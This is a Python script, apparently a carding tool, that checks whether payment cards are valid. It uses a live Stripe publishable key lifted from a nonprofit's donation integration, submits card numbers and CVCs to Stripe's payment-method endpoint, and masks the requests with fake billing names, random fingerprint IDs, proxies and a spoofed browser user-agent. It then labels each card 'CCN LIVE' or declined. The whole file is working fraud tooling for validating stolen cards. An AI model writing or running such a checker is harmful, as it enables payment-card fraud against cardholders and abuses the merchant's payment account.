"""
Pariyatti AUTH Gate - Uses GiveForms Stripe integration
Creates Payment Method to validate card (no charge)
"""

import requests
import random
from typing import Tuple
from faker import Faker


STRIPE_PK = "pk_live_2T8mSGhZyE3A8I2kToOFE1R9"


def pariyatti_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                         proxy: dict = None) -> Tuple[str, bool]:
    """
    Pariyatti AUTH check via Stripe Payment Method creation
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    fake = Faker()
    
    if len(card_yer) == 2:
        card_yer = "20" + card_yer
    
    try:
        session = requests.Session()
        if proxy:
            session.proxies = proxy
        
        guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        }
        
        data = {
            'type': 'card',
            'card[number]': card_num,
            'card[exp_month]': card_mon,
            'card[exp_year]': card_yer,
            'card[cvc]': card_cvc,
            'billing_details[name]': f"{fake.first_name()} {fake.last_name()}",
            'billing_details[address][postal_code]': fake.zipcode(),
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/v3',
            'time_on_page': str(random.randint(30000, 90000)),
            'key': STRIPE_PK,
        }
        
        response = session.post('https://api.stripe.com/v1/payment_methods', 
                               headers=headers, data=data, timeout=20)
        result = response.json()
        
        if 'error' in result:
            error_msg = result['error'].get('message', 'Unknown error')
            error_code = result['error'].get('code', '')
            
            if 'test' in error_msg.lower():
                return ("DECLINED - Live Mode Test Card", True)
            if error_code == 'incorrect_cvc':
                return ("CCN LIVE - Incorrect CVV", True)
            if error_code == 'invalid_cvc':
                return ("CCN LIVE - Invalid CVV", True)
            if error_code == 'expired_card':
                return ("DECLINED - Expired Card", True)
            if error_code == 'card_declined':
                decline_code = result['error'].get('decline_code', '')
                if decline_code == 'insufficient_funds':
                    return ("CCN LIVE - Insufficient Funds", True)
                if decline_code == 'lost_card':
                    return ("DECLINED - Lost Card", True)
                if decline_code == 'stolen_card':
                    return ("DECLINED - Stolen Card", True)
                return (f"DECLINED - {error_msg[:50]}", True)
            if 'number' in error_msg.lower():
                return ("DECLINED - Invalid Card Number", True)
            return (f"DECLINED - {error_msg[:50]}", True)
        
        pm_id = result.get('id')
        if pm_id:
            card_brand = result.get('card', {}).get('brand', 'unknown').upper()
            card_checks = result.get('card', {}).get('checks', {})
            cvc_check = card_checks.get('cvc_check', 'unknown')
            
            if cvc_check == 'fail':
                return (f"CCN LIVE - {card_brand} CVV Mismatch", True)
            elif cvc_check == 'pass':
                return (f"CCN LIVE - {card_brand} Tokenized (CVV OK)", True)
            elif cvc_check == 'unavailable':
                return (f"CCN LIVE - {card_brand} Tokenized (CVV N/A)", True)
            else:
                return (f"CCN LIVE - {card_brand} Tokenized", True)
        
        return ("DECLINED - Tokenization failed", True)
        
    except requests.exceptions.Timeout:
        return ("Error: Request timeout", False)
    except requests.exceptions.RequestException as e:
        return (f"Error: Network issue", False)
    except Exception as e:
        return (f"Error: {str(e)[:40]}", False)


if __name__ == "__main__":
    result, alive = pariyatti_auth_check("4000000000000002", "12", "29", "123")
    print(f"Result: {result}, Proxy OK: {alive}")
